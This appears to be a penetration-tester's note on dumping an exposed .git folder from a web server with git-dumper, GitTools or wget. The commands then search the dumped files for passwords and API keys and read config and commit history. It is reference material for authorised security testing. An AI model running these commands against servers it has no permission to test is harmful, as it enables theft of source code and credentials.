# Git Dumper

In the event that there's an exposed `.git` folder on the web server, GitDumper can be used to dump the contents of those folders.

```bash
# Dump the contents of an exposed .git directory
git-dumper http://[IP/Domain]/.git website_git

# Search for common secrets in the dumped files
grep -r 'password' .
grep -r 'apikey' .

# View a specific file that may contain credentials or sensitive data
cat website_git/config/database.php

# Check the commit log
git log

# Then to check the commit diff
git show [commitID]
```

# GitTools

[GitTools](https://github.com/internetwache/GitTools) downloads Git repository of the web application.  
To dump the repository, execute the following commands.

```bash
wget https://raw.githubusercontent.com/internetwache/GitTools/master/Dumper/gitdumper.sh
chmod +x gitdumper.sh
./gitdumper.sh https://example.com/.git/ ./example
```

We should get the git repository in local.  
Then extract the entire project by executing the following.

```bash
wget https://raw.githubusercontent.com/internetwache/GitTools/master/Extractor/extractor.sh
chmod +x extractor.sh
./extractor.sh ./example ./new_example
```

Now we retrieve the entire git project from website.  
It is stored in **“./new_example”** folder. We can investigate the repository.

# The Manual way

```bash
# Download the .git directory if exposed
sudo wget -r http://[TARGET_IP]/.git/

# Move into the .git directory locally
cd [TARGET_IP]

# Show Git commits and reveal sensitive information
sudo git show
```

# Related Notes

[MOC - Reconnaissance](../0%20-%20MOCs/MOC%20-%20Reconnaissance.md)